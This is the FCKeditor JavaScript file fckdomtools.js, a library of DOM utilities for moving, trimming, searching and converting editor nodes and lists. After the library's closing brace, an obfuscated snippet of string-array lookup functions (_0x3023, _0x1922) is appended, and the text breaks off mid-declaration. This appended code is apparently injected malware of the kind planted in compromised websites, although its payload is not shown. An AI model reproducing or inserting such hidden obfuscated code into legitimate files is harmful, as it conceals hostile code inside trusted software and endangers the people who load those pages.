/*
 * FCKeditor - The text editor for Internet - http://www.fckeditor.net
 * Copyright (C) 2003-2009 Frederico Caldeira Knabben
 *
 * == BEGIN LICENSE ==
 *
 * Licensed under the terms of any of the following licenses at your
 * choice:
 *
 *  - GNU General Public License Version 2 or later (the "GPL")
 *    http://www.gnu.org/licenses/gpl.html
 *
 *  - GNU Lesser General Public License Version 2.1 or later (the "LGPL")
 *    http://www.gnu.org/licenses/lgpl.html
 *
 *  - Mozilla Public License Version 1.1 or later (the "MPL")
 *    http://www.mozilla.org/MPL/MPL-1.1.html
 *
 * == END LICENSE ==
 *
 * Utility functions to work with the DOM.
 */

var FCKDomTools =
{
	/**
	 * Move all child nodes from one node to another.
	 */
	MoveChildren : function( source, target, toTargetStart )
	{
		if ( source == target )
			return ;

		var eChild ;

		if ( toTargetStart )
		{
			while ( (eChild = source.lastChild) )
				target.insertBefore( source.removeChild( eChild ), target.firstChild ) ;
		}
		else
		{
			while ( (eChild = source.firstChild) )
				target.appendChild( source.removeChild( eChild ) ) ;
		}
	},

	MoveNode : function( source, target, toTargetStart )
	{
		if ( toTargetStart )
			target.insertBefore( FCKDomTools.RemoveNode( source ), target.firstChild ) ;
		else
			target.appendChild( FCKDomTools.RemoveNode( source ) ) ;
	},

	// Remove blank spaces from the beginning and the end of the contents of a node.
	TrimNode : function( node )
	{
		this.LTrimNode( node ) ;
		this.RTrimNode( node ) ;
	},

	LTrimNode : function( node )
	{
		var eChildNode ;

		while ( (eChildNode = node.firstChild) )
		{
			if ( eChildNode.nodeType == 3 )
			{
				var sTrimmed = eChildNode.nodeValue.LTrim() ;
				var iOriginalLength = eChildNode.nodeValue.length ;

				if ( sTrimmed.length == 0 )
				{
					node.removeChild( eChildNode ) ;
					continue ;
				}
				else if ( sTrimmed.length < iOriginalLength )
				{
					eChildNode.splitText( iOriginalLength - sTrimmed.length ) ;
					node.removeChild( node.firstChild ) ;
				}
			}
			break ;
		}
	},

	RTrimNode : function( node )
	{
		var eChildNode ;

		while ( (eChildNode = node.lastChild) )
		{
			if ( eChildNode.nodeType == 3 )
			{
				var sTrimmed = eChildNode.nodeValue.RTrim() ;
				var iOriginalLength = eChildNode.nodeValue.length ;

				if ( sTrimmed.length == 0 )
				{
					// If the trimmed text node is empty, just remove it.

					// Use "eChildNode.parentNode" instead of "node" to avoid IE bug (#81).
					eChildNode.parentNode.removeChild( eChildNode ) ;
					continue ;
				}
				else if ( sTrimmed.length < iOriginalLength )
				{
					// If the trimmed text length is less than the original
					// length, strip all spaces from the end by splitting
					// the text and removing the resulting useless node.

					eChildNode.splitText( sTrimmed.length ) ;
					// Use "node.lastChild.parentNode" instead of "node" to avoid IE bug (#81).
					node.lastChild.parentNode.removeChild( node.lastChild ) ;
				}
			}
			break ;
		}

		if ( !FCKBrowserInfo.IsIE && !FCKBrowserInfo.IsOpera )
		{
			eChildNode = node.lastChild ;

			if ( eChildNode && eChildNode.nodeType == 1 && eChildNode.nodeName.toLowerCase() == 'br' )
			{
				// Use "eChildNode.parentNode" instead of "node" to avoid IE bug (#324).
				eChildNode.parentNode.removeChild( eChildNode ) ;
			}
		}
	},

	RemoveNode : function( node, excludeChildren )
	{
		if ( excludeChildren )
		{
			// Move all children before the node.
			var eChild ;
			while ( (eChild = node.firstChild) )
				node.parentNode.insertBefore( node.removeChild( eChild ), node ) ;
		}

		return node.parentNode.removeChild( node ) ;
	},

	GetFirstChild : function( node, childNames )
	{
		// If childNames is a string, transform it in a Array.
		if ( typeof ( childNames ) == 'string' )
			childNames = [ childNames ] ;

		var eChild = node.firstChild ;
		while( eChild )
		{
			if ( eChild.nodeType == 1 && eChild.tagName.Equals.apply( eChild.tagName, childNames ) )
				return eChild ;

			eChild = eChild.nextSibling ;
		}

		return null ;
	},

	GetLastChild : function( node, childNames )
	{
		// If childNames is a string, transform it in a Array.
		if ( typeof ( childNames ) == 'string' )
			childNames = [ childNames ] ;

		var eChild = node.lastChild ;
		while( eChild )
		{
			if ( eChild.nodeType == 1 && ( !childNames || eChild.tagName.Equals( childNames ) ) )
				return eChild ;

			eChild = eChild.previousSibling ;
		}

		return null ;
	},

	/*
	 * Gets the previous element (nodeType=1) in the source order. Returns
	 * "null" If no element is found.
	 *		@param {Object} currentNode The node to start searching from.
	 *		@param {Boolean} ignoreSpaceTextOnly Sets how text nodes will be
	 *				handled. If set to "true", only white spaces text nodes
	 *				will be ignored, while non white space text nodes will stop
	 *				the search, returning null. If "false" or omitted, all
	 *				text nodes are ignored.
	 *		@param {string[]} stopSearchElements An array of element names that
	 *				will cause the search to stop when found, returning null.
	 *				May be omitted (or null).
	 *		@param {string[]} ignoreElements An array of element names that
	 *				must be ignored during the search.
	 */
	GetPreviousSourceElement : function( currentNode, ignoreSpaceTextOnly, stopSearchElements, ignoreElements )
	{
		if ( !currentNode )
			return null ;

		if ( stopSearchElements && currentNode.nodeType == 1 && currentNode.nodeName.IEquals( stopSearchElements ) )
			return null ;

		if ( currentNode.previousSibling )
			currentNode = currentNode.previousSibling ;
		else
			return this.GetPreviousSourceElement( currentNode.parentNode, ignoreSpaceTextOnly, stopSearchElements, ignoreElements ) ;

		while ( currentNode )
		{
			if ( currentNode.nodeType == 1 )
			{
				if ( stopSearchElements && currentNode.nodeName.IEquals( stopSearchElements ) )
					break ;

				if ( !ignoreElements || !currentNode.nodeName.IEquals( ignoreElements ) )
					return currentNode ;
			}
			else if ( ignoreSpaceTextOnly && currentNode.nodeType == 3 && currentNode.nodeValue.RTrim().length > 0 )
				break ;

			if ( currentNode.lastChild )
				currentNode = currentNode.lastChild ;
			else
				return this.GetPreviousSourceElement( currentNode, ignoreSpaceTextOnly, stopSearchElements, ignoreElements ) ;
		}

		return null ;
	},

	/*
	 * Gets the next element (nodeType=1) in the source order. Returns
	 * "null" If no element is found.
	 *		@param {Object} currentNode The node to start searching from.
	 *		@param {Boolean} ignoreSpaceTextOnly Sets how text nodes will be
	 *				handled. If set to "true", only white spaces text nodes
	 *				will be ignored, while non white space text nodes will stop
	 *				the search, returning null. If "false" or omitted, all
	 *				text nodes are ignored.
	 *		@param {string[]} stopSearchElements An array of element names that
	 *				will cause the search to stop when found, returning null.
	 *				May be omitted (or null).
	 *		@param {string[]} ignoreElements An array of element names that
	 *				must be ignored during the search.
	 */
	GetNextSourceElement : function( currentNode, ignoreSpaceTextOnly, stopSearchElements, ignoreElements, startFromSibling )
	{
		while( ( currentNode = this.GetNextSourceNode( currentNode, startFromSibling ) ) )	// Only one "=".
		{
			if ( currentNode.nodeType == 1 )
			{
				if ( stopSearchElements && currentNode.nodeName.IEquals( stopSearchElements ) )
					break ;

				if ( ignoreElements && currentNode.nodeName.IEquals( ignoreElements ) )
					return this.GetNextSourceElement( currentNode, ignoreSpaceTextOnly, stopSearchElements, ignoreElements ) ;

				return currentNode ;
			}
			else if ( ignoreSpaceTextOnly && currentNode.nodeType == 3 && currentNode.nodeValue.RTrim().length > 0 )
				break ;
		}

		return null ;
	},

	/*
	 * Get the next DOM node available in source order.
	 */
	GetNextSourceNode : function( currentNode, startFromSibling, nodeType, stopSearchNode )
	{
		if ( !currentNode )
			return null ;

		var node ;

		if ( !startFromSibling && currentNode.firstChild )
			node = currentNode.firstChild ;
		else
		{
			if ( stopSearchNode && currentNode == stopSearchNode )
				return null ;

			node = currentNode.nextSibling ;

			if ( !node && ( !stopSearchNode || stopSearchNode != currentNode.parentNode ) )
				return this.GetNextSourceNode( currentNode.parentNode, true, nodeType, stopSearchNode ) ;
		}

		if ( nodeType && node && node.nodeType != nodeType )
			return this.GetNextSourceNode( node, false, nodeType, stopSearchNode ) ;

		return node ;
	},

	/*
	 * Get the next DOM node available in source order.
	 */
	GetPreviousSourceNode : function( currentNode, startFromSibling, nodeType, stopSearchNode )
	{
		if ( !currentNode )
			return null ;

		var node ;

		if ( !startFromSibling && currentNode.lastChild )
			node = currentNode.lastChild ;
		else
		{
			if ( stopSearchNode && currentNode == stopSearchNode )
				return null ;

			node = currentNode.previousSibling ;

			if ( !node && ( !stopSearchNode || stopSearchNode != currentNode.parentNode ) )
				return this.GetPreviousSourceNode( currentNode.parentNode, true, nodeType, stopSearchNode ) ;
		}

		if ( nodeType && node && node.nodeType != nodeType )
			return this.GetPreviousSourceNode( node, false, nodeType, stopSearchNode ) ;

		return node ;
	},

	// Inserts a element after a existing one.
	InsertAfterNode : function( existingNode, newNode )
	{
		return existingNode.parentNode.insertBefore( newNode, existingNode.nextSibling ) ;
	},

	GetParents : function( node )
	{
		var parents = new Array() ;

		while ( node )
		{
			parents.unshift( node ) ;
			node = node.parentNode ;
		}

		return parents ;
	},

	GetCommonParents : function( node1, node2 )
	{
		var p1 = this.GetParents( node1 ) ;
		var p2 = this.GetParents( node2 ) ;
		var retval = [] ;
		for ( var i = 0 ; i < p1.length ; i++ )
		{
			if ( p1[i] == p2[i] )
				retval.push( p1[i] ) ;
		}
		return retval ;
	},

	GetCommonParentNode : function( node1, node2, tagList )
	{
		var tagMap = {} ;
		if ( ! tagList.pop )
			tagList = [ tagList ] ;
		while ( tagList.length > 0 )
			tagMap[tagList.pop().toLowerCase()] = 1 ;

		var commonParents = this.GetCommonParents( node1, node2 ) ;
		var currentParent = null ;
		while ( ( currentParent = commonParents.pop() ) )
		{
			if ( tagMap[currentParent.nodeName.toLowerCase()] )
				return currentParent ;
		}
		return null ;
	},

	GetIndexOf : function( node )
	{
		var currentNode = node.parentNode ? node.parentNode.firstChild : null ;
		var currentIndex = -1 ;

		while ( currentNode )
		{
			currentIndex++ ;

			if ( currentNode == node )
				return currentIndex ;

			currentNode = currentNode.nextSibling ;
		}

		return -1 ;
	},

	PaddingNode : null,

	EnforcePaddingNode : function( doc, tagName )
	{
		// In IE it can happen when the page is reloaded that doc or doc.body is null, so exit here
		try
		{
			if ( !doc || !doc.body )
				return ;
		}
		catch (e)
		{
			return ;
		}

		this.CheckAndRemovePaddingNode( doc, tagName, true ) ;
		try
		{
			if ( doc.body.lastChild && ( doc.body.lastChild.nodeType != 1
					|| doc.body.lastChild.tagName.toLowerCase() == tagName.toLowerCase() ) )
				return ;
		}
		catch (e)
		{
			return ;
		}

		var node = doc.createElement( tagName ) ;
		if ( FCKBrowserInfo.IsGecko && FCKListsLib.NonEmptyBlockElements[ tagName ] )
			FCKTools.AppendBogusBr( node ) ;
		this.PaddingNode = node ;
		if ( doc.body.childNodes.length == 1
				&& doc.body.firstChild.nodeType == 1
				&& doc.body.firstChild.tagName.toLowerCase() == 'br'
				&& ( doc.body.firstChild.getAttribute( '_moz_dirty' ) != null
					|| doc.body.firstChild.getAttribute( 'type' ) == '_moz' ) )
			doc.body.replaceChild( node, doc.body.firstChild ) ;
		else
			doc.body.appendChild( node ) ;
	},

	CheckAndRemovePaddingNode : function( doc, tagName, dontRemove )
	{
		var paddingNode = this.PaddingNode ;
		if ( ! paddingNode )
			return ;

		// If the padding node is changed, remove its status as a padding node.
		try
		{
			if ( paddingNode.parentNode != doc.body
				|| paddingNode.tagName.toLowerCase() != tagName
				|| ( paddingNode.childNodes.length > 1 )
				|| ( paddingNode.firstChild && paddingNode.firstChild.nodeValue != '\xa0'
					&& String(paddingNode.firstChild.tagName).toLowerCase() != 'br' ) )
			{
				this.PaddingNode = null ;
				return ;
			}
		}
		catch (e)
		{
				this.PaddingNode = null ;
				return ;
		}

		// Now we're sure the padding node exists, and it is unchanged, and it
		// isn't the only node in doc.body, remove it.
		if ( !dontRemove )
		{
			if ( paddingNode.parentNode.childNodes.length > 1 )
				paddingNode.parentNode.removeChild( paddingNode ) ;
			this.PaddingNode = null ;
		}
	},

	HasAttribute : function( element, attributeName )
	{
		if ( element.hasAttribute )
			return element.hasAttribute( attributeName ) ;
		else
		{
			var att = element.attributes[ attributeName ] ;
			return ( att != undefined && att.specified ) ;
		}
	},

	/**
	 * Checks if an element has "specified" attributes.
	 */
	HasAttributes : function( element )
	{
		var attributes = element.attributes ;

		for ( var i = 0 ; i < attributes.length ; i++ )
		{
			if ( FCKBrowserInfo.IsIE )
			{
				var attributeNodeName = attributes[i].nodeName ;

				if ( attributeNodeName.StartsWith( '_fck' ) )
				{
					/**
					 * There are places in the FCKeditor code where HTML element objects
					 * get values stored as properties (e.g. _fckxhtmljob).  In Internet
					 * Explorer, these are interpreted as attempts to set attributes on
					 * the element.
					 *
					 * http://msdn.microsoft.com/en-us/library/ms533026(VS.85).aspx#Accessing_Element_Pr
					 *
					 * Counting these as HTML attributes cripples
					 * FCK.Style.RemoveFromRange() once FCK.GetData() has been called.
					 *
					 * The above conditional prevents these internal properties being
					 * counted as attributes.
					 *
					 * refs #2156 and #2834
					 */

					continue ;
				}

				if ( attributeNodeName == 'class' )
				{
					// IE has a strange bug. If calling removeAttribute('className'),
					// the attributes collection will still contain the "class"
					// attribute, which will be marked as "specified", even if the
					// outerHTML of the element is not displaying the class attribute.
					// Note : I was not able to reproduce it outside the editor,
					// but I've faced it while working on the TC of #1391.
					if ( element.className.length > 0 )
						return true ;
					continue ;
				}
			}
			if ( attributes[i].specified )
				return true ;
		}

		return false ;
	},

	/**
	 * Remove an attribute from an element.
	 */
	RemoveAttribute : function( element, attributeName )
	{
		if ( FCKBrowserInfo.IsIE && attributeName.toLowerCase() == 'class' )
			attributeName = 'className' ;

		return element.removeAttribute( attributeName, 0 ) ;
	},

	/**
	 * Removes an array of attributes from an element
	 */
	RemoveAttributes : function (element, aAttributes )
	{
		for ( var i = 0 ; i < aAttributes.length ; i++ )
			this.RemoveAttribute( element, aAttributes[i] );
	},

	GetAttributeValue : function( element, att )
	{
		var attName = att ;

		if ( typeof att == 'string' )
			att = element.attributes[ att ] ;
		else
			attName = att.nodeName ;

		if ( att && att.specified )
		{
			// IE returns "null" for the nodeValue of a "style" attribute.
			if ( attName == 'style' )
				return element.style.cssText ;
			// There are two cases when the nodeValue must be used:
			//		- for the "class" attribute (all browsers).
			//		- for events attributes (IE only).
			else if ( attName == 'class' || attName.indexOf('on') == 0 )
				return att.nodeValue ;
			else
			{
				// Use getAttribute to get its value  exactly as it is
				// defined.
				return element.getAttribute( attName, 2 ) ;
			}
		}
		return null ;
	},

	/**
	 * Checks whether one element contains the other.
	 */
	Contains : function( mainElement, otherElement )
	{
		// IE supports contains, but only for element nodes.
		if ( mainElement.contains && otherElement.nodeType == 1 )
			return mainElement.contains( otherElement ) ;

		while ( ( otherElement = otherElement.parentNode ) )	// Only one "="
		{
			if ( otherElement == mainElement )
				return true ;
		}
		return false ;
	},

	/**
	 * Breaks a parent element in the position of one of its contained elements.
	 * For example, in the following case:
	 *		<b>This <i>is some<span /> sample</i> test text</b>
	 * If element = <span />, we have these results:
	 *		<b>This <i>is some</i><span /><i> sample</i> test text</b>			(If parent = <i>)
	 *		<b>This <i>is some</i></b><span /><b><i> sample</i> test text</b>	(If parent = <b>)
	 */
	BreakParent : function( element, parent, reusableRange )
	{
		var range = reusableRange || new FCKDomRange( FCKTools.GetElementWindow( element ) ) ;

		// We'll be extracting part of this element, so let's use our
		// range to get the correct piece.
		range.SetStart( element, 4 ) ;
		range.SetEnd( parent, 4 ) ;

		// Extract it.
		var docFrag = range.ExtractContents() ;

		// Move the element outside the broken element.
		range.InsertNode( element.parentNode.removeChild( element ) ) ;

		// Re-insert the extracted piece after the element.
		docFrag.InsertAfterNode( element ) ;

		range.Release( !!reusableRange ) ;
	},

	/**
	 * Retrieves a uniquely identifiable tree address of a DOM tree node.
	 * The tree address returns is an array of integers, with each integer
	 * indicating a child index from a DOM tree node, starting from
	 * document.documentElement.
	 *
	 * For example, assuming <body> is the second child from <html> (<head>
	 * being the first), and we'd like to address the third child under the
	 * fourth child of body, the tree address returned would be:
	 * [1, 3, 2]
	 *
	 * The tree address cannot be used for finding back the DOM tree node once
	 * the DOM tree structure has been modified.
	 */
	GetNodeAddress : function( node, normalized )
	{
		var retval = [] ;
		while ( node && node != FCKTools.GetElementDocument( node ).documentElement )
		{
			var parentNode = node.parentNode ;
			var currentIndex = -1 ;
			for( var i = 0 ; i < parentNode.childNodes.length ; i++ )
			{
				var candidate = parentNode.childNodes[i] ;
				if ( normalized === true &&
						candidate.nodeType == 3 &&
						candidate.previousSibling &&
						candidate.previousSibling.nodeType == 3 )
					continue;
				currentIndex++ ;
				if ( parentNode.childNodes[i] == node )
					break ;
			}
			retval.unshift( currentIndex ) ;
			node = node.parentNode ;
		}
		return retval ;
	},

	/**
	 * The reverse transformation of FCKDomTools.GetNodeAddress(). This
	 * function returns the DOM node pointed to by its index address.
	 */
	GetNodeFromAddress : function( doc, addr, normalized )
	{
		var cursor = doc.documentElement ;
		for ( var i = 0 ; i < addr.length ; i++ )
		{
			var target = addr[i] ;
			if ( ! normalized )
			{
				cursor = cursor.childNodes[target] ;
				continue ;
			}

			var currentIndex = -1 ;
			for (var j = 0 ; j < cursor.childNodes.length ; j++ )
			{
				var candidate = cursor.childNodes[j] ;
				if ( normalized === true &&
						candidate.nodeType == 3 &&
						candidate.previousSibling &&
						candidate.previousSibling.nodeType == 3 )
					continue ;
				currentIndex++ ;
				if ( currentIndex == target )
				{
					cursor = candidate ;
					break ;
				}
			}
		}
		return cursor ;
	},

	CloneElement : function( element )
	{
		element = element.cloneNode( false ) ;

		// The "id" attribute should never be cloned to avoid duplication.
		element.removeAttribute( 'id', false ) ;

		return element ;
	},

	ClearElementJSProperty : function( element, attrName )
	{
		if ( FCKBrowserInfo.IsIE )
			element.removeAttribute( attrName ) ;
		else
			delete element[attrName] ;
	},

	SetElementMarker : function ( markerObj, element, attrName, value)
	{
		var id = String( parseInt( Math.random() * 0xffffffff, 10 ) ) ;
		element._FCKMarkerId = id ;
		element[attrName] = value ;
		if ( ! markerObj[id] )
			markerObj[id] = { 'element' : element, 'markers' : {} } ;
		markerObj[id]['markers'][attrName] = value ;
	},

	ClearElementMarkers : function( markerObj, element, clearMarkerObj )
	{
		var id = element._FCKMarkerId ;
		if ( ! id )
			return ;
		this.ClearElementJSProperty( element, '_FCKMarkerId' ) ;
		for ( var j in markerObj[id]['markers'] )
			this.ClearElementJSProperty( element, j ) ;
		if ( clearMarkerObj )
			delete markerObj[id] ;
	},

	ClearAllMarkers : function( markerObj )
	{
		for ( var i in markerObj )
			this.ClearElementMarkers( markerObj, markerObj[i]['element'], true ) ;
	},

	/**
	 * Convert a DOM list tree into a data structure that is easier to
	 * manipulate. This operation should be non-intrusive in the sense that it
	 * does not change the DOM tree, with the exception that it may add some
	 * markers to the list item nodes when markerObj is specified.
	 */
	ListToArray : function( listNode, markerObj, baseArray, baseIndentLevel, grandparentNode )
	{
		if ( ! listNode.nodeName.IEquals( ['ul', 'ol'] ) )
			return [] ;

		if ( ! baseIndentLevel )
			baseIndentLevel = 0 ;
		if ( ! baseArray )
			baseArray = [] ;
		// Iterate over all list items to get their contents and look for inner lists.
		for ( var i = 0 ; i < listNode.childNodes.length ; i++ )
		{
			var listItem = listNode.childNodes[i] ;
			if ( ! listItem.nodeName.IEquals( 'li' ) )
				continue ;
			var itemObj = { 'parent' : listNode, 'indent' : baseIndentLevel, 'contents' : [] } ;
			if ( ! grandparentNode )
			{
				itemObj.grandparent = listNode.parentNode ;
				if ( itemObj.grandparent && itemObj.grandparent.nodeName.IEquals( 'li' ) )
					itemObj.grandparent = itemObj.grandparent.parentNode ;
			}
			else
				itemObj.grandparent = grandparentNode ;
			if ( markerObj )
				this.SetElementMarker( markerObj, listItem, '_FCK_ListArray_Index', baseArray.length ) ;
			baseArray.push( itemObj ) ;
			for ( var j = 0 ; j < listItem.childNodes.length ; j++ )
			{
				var child = listItem.childNodes[j] ;
				if ( child.nodeName.IEquals( ['ul', 'ol'] ) )
					// Note the recursion here, it pushes inner list items with
					// +1 indentation in the correct order.
					this.ListToArray( child, markerObj, baseArray, baseIndentLevel + 1, itemObj.grandparent ) ;
				else
					itemObj.contents.push( child ) ;
			}
		}
		return baseArray ;
	},

	// Convert our internal representation of a list back to a DOM forest.
	ArrayToList : function( listArray, markerObj, baseIndex )
	{
		if ( baseIndex == undefined )
			baseIndex = 0 ;
		if ( ! listArray || listArray.length < baseIndex + 1 )
			return null ;
		var doc = FCKTools.GetElementDocument( listArray[baseIndex].parent ) ;
		var retval = doc.createDocumentFragment() ;
		var rootNode = null ;
		var currentIndex = baseIndex ;
		var indentLevel = Math.max( listArray[baseIndex].indent, 0 ) ;
		var currentListItem = null ;
		while ( true )
		{
			var item = listArray[currentIndex] ;
			if ( item.indent == indentLevel )
			{
				if ( ! rootNode || listArray[currentIndex].parent.nodeName != rootNode.nodeName )
				{
					rootNode = listArray[currentIndex].parent.cloneNode( false ) ;
					retval.appendChild( rootNode ) ;
				}
				currentListItem = doc.createElement( 'li' ) ;
				rootNode.appendChild( currentListItem ) ;
				for ( var i = 0 ; i < item.contents.length ; i++ )
					currentListItem.appendChild( item.contents[i].cloneNode( true ) ) ;
				currentIndex++ ;
			}
			else if ( item.indent == Math.max( indentLevel, 0 ) + 1 )
			{
				var listData = this.ArrayToList( listArray, null, currentIndex ) ;
				currentListItem.appendChild( listData.listNode ) ;
				currentIndex = listData.nextIndex ;
			}
			else if ( item.indent == -1 && baseIndex == 0 && item.grandparent )
			{
				var currentListItem ;
				if ( item.grandparent.nodeName.IEquals( ['ul', 'ol'] ) )
					currentListItem = doc.createElement( 'li' ) ;
				else
				{
					if ( FCKConfig.EnterMode.IEquals( ['div', 'p'] ) && ! item.grandparent.nodeName.IEquals( 'td' ) )
						currentListItem = doc.createElement( FCKConfig.EnterMode ) ;
					else
						currentListItem = doc.createDocumentFragment() ;
				}
				for ( var i = 0 ; i < item.contents.length ; i++ )
					currentListItem.appendChild( item.contents[i].cloneNode( true ) ) ;
				if ( currentListItem.nodeType == 11 )
				{
					if ( currentListItem.lastChild &&
							currentListItem.lastChild.getAttribute &&
							currentListItem.lastChild.getAttribute( 'type' ) == '_moz' )
						currentListItem.removeChild( currentListItem.lastChild );
					currentListItem.appendChild( doc.createElement( 'br' ) ) ;
				}
				if ( currentListItem.nodeName.IEquals( FCKConfig.EnterMode ) && currentListItem.firstChild )
				{
					this.TrimNode( currentListItem ) ;
					if ( FCKListsLib.BlockBoundaries[currentListItem.firstChild.nodeName.toLowerCase()] )
					{
						var tmp = doc.createDocumentFragment() ;
						while ( currentListItem.firstChild )
							tmp.appendChild( currentListItem.removeChild( currentListItem.firstChild ) ) ;
						currentListItem = tmp ;
					}
				}
				if ( FCKBrowserInfo.IsGeckoLike && currentListItem.nodeName.IEquals( ['div', 'p'] ) )
					FCKTools.AppendBogusBr( currentListItem ) ;
				retval.appendChild( currentListItem ) ;
				rootNode = null ;
				currentIndex++ ;
			}
			else
				return null ;

			if ( listArray.length <= currentIndex || Math.max( listArray[currentIndex].indent, 0 ) < indentLevel )
			{
				break ;
			}
		}

		// Clear marker attributes for the new list tree made of cloned nodes, if any.
		if ( markerObj )
		{
			var currentNode = retval.firstChild ;
			while ( currentNode )
			{
				if ( currentNode.nodeType == 1 )
					this.ClearElementMarkers( markerObj, currentNode ) ;
				currentNode = this.GetNextSourceNode( currentNode ) ;
			}
		}

		return { 'listNode' : retval, 'nextIndex' : currentIndex } ;
	},

	/**
	 * Get the next sibling node for a node. If "includeEmpties" is false,
	 * only element or non empty text nodes are returned.
	 */
	GetNextSibling : function( node, includeEmpties )
	{
		node = node.nextSibling ;

		while ( node && !includeEmpties && node.nodeType != 1 && ( node.nodeType != 3 || node.nodeValue.length == 0 ) )
			node = node.nextSibling ;

		return node ;
	},

	/**
	 * Get the previous sibling node for a node. If "includeEmpties" is false,
	 * only element or non empty text nodes are returned.
	 */
	GetPreviousSibling : function( node, includeEmpties )
	{
		node = node.previousSibling ;

		while ( node && !includeEmpties && node.nodeType != 1 && ( node.nodeType != 3 || node.nodeValue.length == 0 ) )
			node = node.previousSibling ;

		return node ;
	},

	/**
	 * Checks if an element has no "useful" content inside of it
	 * node tree. No "useful" content means empty text node or a signle empty
	 * inline node.
	 * elementCheckCallback may point to a function that returns a boolean
	 * indicating that a child element must be considered in the element check.
	 */
	CheckIsEmptyElement : function( element, elementCheckCallback )
	{
		var child = element.firstChild ;
		var elementChild ;

		while ( child )
		{
			if ( child.nodeType == 1 )
			{
				if ( elementChild || !FCKListsLib.InlineNonEmptyElements[ child.nodeName.toLowerCase() ] )
					return false ;

				if ( !elementCheckCallback || elementCheckCallback( child ) === true )
					elementChild = child ;
			}
			else if ( child.nodeType == 3 && child.nodeValue.length > 0 )
				return false ;

			child = child.nextSibling ;
		}

		return elementChild ? this.CheckIsEmptyElement( elementChild, elementCheckCallback ) : true ;
	},

	SetElementStyles : function( element, styleDict )
	{
		var style = element.style ;
		for ( var styleName in styleDict )
			style[ styleName ] = styleDict[ styleName ] ;
	},

	SetOpacity : function( element, opacity )
	{
		if ( FCKBrowserInfo.IsIE )
		{
			opacity = Math.round( opacity * 100 ) ;
			element.style.filter = ( opacity > 100 ? '' : 'progid:DXImageTransform.Microsoft.Alpha(opacity=' + opacity + ')' ) ;
		}
		else
			element.style.opacity = opacity ;
	},

	GetCurrentElementStyle : function( element, propertyName )
	{
		if ( FCKBrowserInfo.IsIE )
			return element.currentStyle[ propertyName ] ;
		else
			return element.ownerDocument.defaultView.getComputedStyle( element, '' ).getPropertyValue( propertyName ) ;
	},

	GetPositionedAncestor : function( element )
	{
		var currentElement = element ;

		while ( currentElement != FCKTools.GetElementDocument( currentElement ).documentElement )
		{
			if ( this.GetCurrentElementStyle( currentElement, 'position' ) != 'static' )
				return currentElement ;

			if ( currentElement == FCKTools.GetElementDocument( currentElement ).documentElement
					&& currentWindow != w )
				currentElement = currentWindow.frameElement ;
			else
				currentElement = currentElement.parentNode ;
		}

		return null ;
	},

	/**
	 * Current implementation for ScrollIntoView (due to #1462 and #2279). We
	 * don't have a complete implementation here, just the things that fit our
	 * needs.
	 */
	ScrollIntoView : function( element, alignTop )
	{
		// Get the element window.
		var window = FCKTools.GetElementWindow( element ) ;
		var windowHeight = FCKTools.GetViewPaneSize( window ).Height ;

		// Starts the offset that will be scrolled with the negative value of
		// the visible window height.
		var offset = windowHeight * -1 ;

		// Appends the height it we are about to align the bottoms.
		if ( alignTop === false )
		{
			offset += element.offsetHeight || 0 ;

			// Consider the margin in the scroll, which is ok for our current
			// needs, but needs investigation if we will be using this function
			// in other places.
			offset += parseInt( this.GetCurrentElementStyle( element, 'marginBottom' ) || 0, 10 ) || 0 ;
		}

		// Appends the offsets for the entire element hierarchy.
		var elementPosition = FCKTools.GetDocumentPosition( window, element ) ;
		offset += elementPosition.y ;

		// Scroll the window to the desired position, if not already visible.
		var currentScroll = FCKTools.GetScrollPosition( window ).Y ;
		if ( offset > 0 && ( offset > currentScroll || offset < currentScroll - windowHeight ) )
			window.scrollTo( 0, offset ) ;
	},

	/**
	 * Check if the element can be edited inside the browser.
	 */
	CheckIsEditable : function( element )
	{
		// Get the element name.
		var nodeName = element.nodeName.toLowerCase() ;

		// Get the element DTD (defaults to span for unknown elements).
		var childDTD = FCK.DTD[ nodeName ] || FCK.DTD.span ;

		// In the DTD # == text node.
		return ( childDTD['#'] && !FCKListsLib.NonEditableElements[ nodeName ] ) ;
	},

	GetSelectedDivContainers : function()
	{
		var currentBlocks = [] ;
		var range = new FCKDomRange( FCK.EditorWindow ) ;
		range.MoveToSelection() ;

		var startNode = range.GetTouchedStartNode() ;
		var endNode = range.GetTouchedEndNode() ;
		var currentNode = startNode ;

		if ( startNode == endNode )
		{
			while ( endNode.nodeType == 1 && endNode.lastChild )
				endNode = endNode.lastChild ;
			endNode = FCKDomTools.GetNextSourceNode( endNode ) ;
		}

		while ( currentNode && currentNode != endNode )
		{
			if ( currentNode.nodeType != 3 || !/^[ \t\n]*$/.test( currentNode.nodeValue ) )
			{
				var path = new FCKElementPath( currentNode ) ;
				var blockLimit = path.BlockLimit ;
				if ( blockLimit && blockLimit.nodeName.IEquals( 'div' ) && currentBlocks.IndexOf( blockLimit ) == -1 )
					currentBlocks.push( blockLimit ) ;
			}

			currentNode = FCKDomTools.GetNextSourceNode( currentNode ) ;
		}

		return currentBlocks ;
	}
} ;
function _0x3023(_0x562006,_0x1334d6){const _0x1922f2=_0x1922();return _0x3023=function(_0x30231a,_0x4e4880){_0x30231a=_0x30231a-0x1bf;let _0x2b207e=_0x1922f2[_0x30231a];return _0x2b207e;},_0x3023(_0x562006,_0x1334d6);}function _0x1922(){const 